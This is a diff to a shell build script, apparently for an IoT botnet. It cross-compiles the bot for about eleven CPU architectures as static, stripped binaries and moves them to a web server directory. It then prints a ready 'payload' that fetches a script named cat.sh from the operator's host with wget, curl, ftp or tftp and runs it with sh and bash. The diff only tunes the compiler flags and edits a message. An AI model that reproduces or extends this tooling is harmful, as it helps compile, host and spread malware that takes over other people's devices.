@@ -35,17 +35,16 @@ apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
 apt install gcc-sh4-linux-gnu -y
 
-powerpc64-linux-gnu-gcc -static -pthread -DARCH_powerpc64 *.c -o powerpc64
-mips-linux-gnu-gcc -static -pthread -DARCH_mips *.c -o mips
-mipsel-linux-gnu-gcc -static -pthread -DARCH_mipsel *.c -o mipsel
-sparc64-linux-gnu-gcc -static -pthread -DARCH_sparc *.c -o sparc
-arm-linux-gnueabi-gcc -static -pthread -DARCH_arm *.c -o arm
-aarch64-linux-gnu-gcc -static -pthread -DARCH_aarch64 *.c -o aarch64
-m68k-linux-gnu-gcc -static -pthread -DARCH_m68k *.c -o m68k
-i686-linux-gnu-gcc -static -pthread -DARCH_i686 *.c -o i686
-arm-linux-gnueabihf-gcc -static -pthread -DARCH_arm *.c -o armhf
-x86_64-linux-gnu-gcc -static -pthread -DARCH_x86_64 *.c -o x86_64
-sh4-linux-gnu-gcc -static -pthread -DARCH_sh4 *.c -o sh4
+powerpc64-linux-gnu-gcc *.c -o powerpc64 -pthread -DARCH_powerpc64 -static -O3 -ffunction-sections -Wl,--gc-sections -s
+mips-linux-gnu-gcc *.c -o mips -pthread -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s
+mipsel-linux-gnu-gcc *.c -o mipsel -pthread -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s
+sparc64-linux-gnu-gcc *.c -o sparc -pthread -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s
+arm-linux-gnueabi-gcc *.c -o arm -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s
+aarch64-linux-gnu-gcc *.c -o aarch64 -pthread -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s
+m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s
+i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s
+arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s
+sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s
 
 #move binaries to apache2 dir
 mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html
@@ -127,6 +126,6 @@ EOF
 echo "DONE COMPILING BOT, BINS IN /var/www/html"
 echo "THIS COMPILER IS NOT RECOMMENDED"
 echo "Your payload is: wget http://$IP/cat.sh; curl http://$IP/cat.sh -o cat.sh; ftp http://$IP/cat.sh; tftp $IP -c get cat.sh; sh cat.sh; bash cat.sh;"
-echo "if ur port aint default 80 its not my problem do it manually urself thats just too much work for me"
+echo "if ur port aint default 80 its not my problem do it manually urself thats just too much work for me, if you dont know what this is and just got a fresh vps you can ignore this message"
 
 exit 0
